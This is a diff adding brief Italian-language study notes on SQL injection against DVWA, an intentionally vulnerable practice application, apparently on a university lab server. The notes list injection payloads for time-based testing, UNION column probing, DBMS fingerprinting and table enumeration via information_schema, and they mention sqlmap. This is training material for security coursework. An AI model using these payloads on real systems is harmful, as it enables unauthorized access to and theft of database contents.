@@ -1,0 +1,39 @@
+
+https://dvwa.laser.di.unimi.it/login.php
+
+login:
+admin
+password
+
+
+in input: chiudo stringa ->
+	' OR sleep(1); -- //inizia commento, così non ha problemi di bad formatted cmd.		
+.
+
+Come scoprire le info che una query ha?
+
+- Possiamo fare brute force -> ' UNION SELECT 1; --
+	se non worka -> ' UNION SELECT 1, 2; --
+	ecc... finchè non ho response corretto. 
+
+Per ottenere info sul dbms in funzione di quello che riusciamo a iniettare -> ' UNION SELECT 1, user_name(); --  //fingerprinting
+Se ci dice che questa funzione non c'è, possiamo escludere la classe di dbms in cui è presente quella funzione. 
+	' UNION SELECT 1, user(); -- 
+	' UNION SELECT 1, version(); -- 
+.
+
+//concatena i nomi delle colonne
+Per avere la lista delle tabelle del db: ' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables ; -- 
+
+In kali c'è strumento per trovare sql injections -> sqlmap (simile a nmap). Bisogna passargli i cookie tho.
+
+Comando per fare lo scan con aggiunta di --t qualcosa.
+
+
+
+
+
+
+
+
+
